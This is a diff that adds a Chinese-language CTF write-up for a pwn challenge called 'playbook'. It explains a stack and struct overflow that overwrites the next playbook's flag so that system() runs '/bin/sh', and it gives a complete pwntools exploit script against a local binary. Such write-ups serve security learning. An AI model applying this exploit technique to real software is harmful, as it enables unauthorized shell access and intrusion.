@@ -357,3 +357,64 @@ p.send(p8(0))
 p.interactive()
 ```
 随便找了一个 libc-2.39.so patch 上去打的，可能和原始题目的 libc 版本不同，可以注意一下   
+
+## playbook
+
+经典栈题，基本都是利用题目具体逻辑条件来攻击   
+本题在 bss 段维护了一个 `playbook array`，每个元素为以下结构体   
+```c
+struct playbook {
+  unsigned flag;
+  unsigned children[10];
+  char content[0x200];
+};
+```
+它的漏洞是可以先栈上向前溢出，控制 fgets 的 size, 从而 content 可以溢出控制下一个结构体的 `flag`, `children`, `content` 较为前面的部分   
+该题目通过 `flag` 控制 `playbook` 的类型，`flag|2 == 2` 的话，标志该结构体的 content 可以当作 `system` 的第一个参数执行，但是检查了 `content` 为 `sleep 1`, `date`, `ls`   
+通过溢出，我们可以覆盖下一个 `playbook` 的 `flag` 使得 `flag|2 == 2` 满足条件，然后 `content` 设置为 `/bin/sh\x00` 即可   
+
+这道题原语转换还是感觉有点小难orz   
+
+```py
+from pwn import *
+context(os='linux', log_level='debug')
+# first set cmd for the 610th chunk, then incline the child for 4 times, then exit, do the second time, end_step for 2 times and incline step once, to let v14 be a big number
+# then we overflow the content, setting the overflowed note to /bin/sh   
+
+p = process("./chal")
+for i in range(610):
+    p.recvuntil("5. Quit\n")
+    p.sendline("2")
+    p.recvuntil("Enter new playbook in the SOPS language. Empty line finishes the entry.\n")
+    p.sendline("cmd: ls")
+    p.sendline("")
+p.recvuntil("5. Quit\n")
+p.sendline("2")
+p.recvuntil("Enter new playbook in the SOPS language. Empty line finishes the entry.\n")
+p.sendline("cmd: ls")
+for i in range(4):
+    p.sendline("STEP")
+p.sendline("")
+p.recvuntil("5. Quit\n")
+p.sendline("2")
+# gdb.attach(p, '''
+# b* 0x401fcf
+# ''')
+# pause()
+p.recvuntil("Enter new playbook in the SOPS language. Empty line finishes the entry.\n")
+for  i in range(2):
+    p.sendline("ENDSTEP")
+p.sendline("STEP")
+note = b"a" * 512 + p8(3)
+note = note.ljust(512 + 44, b'a')
+note += b"/bin/sh\x00"
+payload = b"note: " + note
+p.sendline(payload)
+p.sendline("")
+# todo check out which book is copied into
+p.recvuntil("5. Quit\n")
+p.sendline("4")
+p.recvuntil("Enter playbook id:\n")
+p.sendline(str(0x26a))
+p.interactive()
+```
